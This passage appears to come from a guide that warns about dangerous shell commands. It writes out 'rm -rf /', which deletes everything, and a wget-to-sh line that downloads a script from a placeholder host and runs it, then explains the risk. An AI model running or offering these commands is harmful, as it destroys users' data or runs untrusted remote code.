#### Deletes Everything
```
rm -rf /
```
#### Downloads and Runs a Script

```
wget http://example.com/something -O – | sh
```

The above line downloads a script from the web and sends it to sh,which executes the contents of the script. This can be dangerous if you’re not sure what the script is or if you don’t trust its source – don’t run untrusted scripts.
